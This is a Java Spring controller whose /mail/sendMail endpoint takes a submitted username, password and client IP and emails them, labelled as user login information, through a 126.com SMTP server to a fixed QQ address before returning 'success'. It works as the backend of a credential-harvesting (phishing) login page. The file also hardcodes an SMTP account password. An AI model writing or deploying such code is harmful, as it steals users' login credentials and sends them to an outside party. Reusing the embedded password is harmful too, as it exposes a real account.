package cn.blaze.controller;

import java.util.Properties;

import javax.mail.Address;
import javax.mail.Authenticator;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMessage.RecipientType;
import javax.mail.internet.MimeUtility;
import javax.servlet.http.HttpServletRequest;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
@RequestMapping("/mail")
public class MailController {
	
	@RequestMapping("sendMail")
	public String sendMail(HttpServletRequest request){
		
		try {
			String userIp = getIpAddress(request);
			String pwd = request.getParameter("password");
			String uname = request.getParameter("username");
			String content = "用户登录信息:Ip:"+userIp+"\r\n username:"+uname+"\r\n password:"+pwd;
			
			//第一步：声明properties放信息对象
			Properties prop=new Properties();
			//设置连接哪台服务器
			prop.setProperty("mail.host", "smtp.126.com");
			//设置是否验证
			prop.setProperty("mail.smtp.auth", "true");
			//声明用户名和密码
			Authenticator auth=new Authenticator() {
				//返回用户名和密码的对象
				public PasswordAuthentication getPasswordAuthentication()
				{
					PasswordAuthentication pa=new PasswordAuthentication("tobyond", "Liu982195");
					return pa;
				}
			};
			//获得邮件对象
//			Session session=Session.getInstance(props, authenticator); // 发送不是使用同一个邮箱时使用
			//获得邮件对象
			Session session=Session.getDefaultInstance(prop, auth);
			//设置session的调试模式
			session.setDebug(true);
			//第三步：声明信息
			MimeMessage mm=new MimeMessage(session);
			//第四步：设置发件人email
			Address from=new InternetAddress("tobyond@126.com");
			mm.setFrom(from);
			//第五步：设置收件人
			mm.setRecipient(RecipientType.TO, new InternetAddress("840172843@qq.com"));
			//第六步：设置主题
			mm.setSubject( MimeUtility.encodeText( "邮件标题-用户点击登录","gb2312","B"));
			mm.setContent(content, "text/plain;charset=utf-8");
			//第七步： 发送邮件
			Transport.send(mm);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return "success";
	}
	
	/**
	 * 获取用户真实IP
	 * @Title getIpAddress
	 * @Description：
	 * @param request
	 * @return
	 * @user LiuLei 2017年4月19日
	 * @updater：
	 * @updateTime：
	 */
	public static String getIpAddress(HttpServletRequest request) {  
        String ip = request.getHeader("x-forwarded-for");  
        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
            ip = request.getHeader("Proxy-Client-IP");  
        }  
        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
            ip = request.getHeader("WL-Proxy-Client-IP");  
        }  
        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
            ip = request.getHeader("HTTP_CLIENT_IP");  
        }  
        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
            ip = request.getHeader("HTTP_X_FORWARDED_FOR");  
        }  
        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
            ip = request.getRemoteAddr();  
        }  
        return ip;  
    } 
}
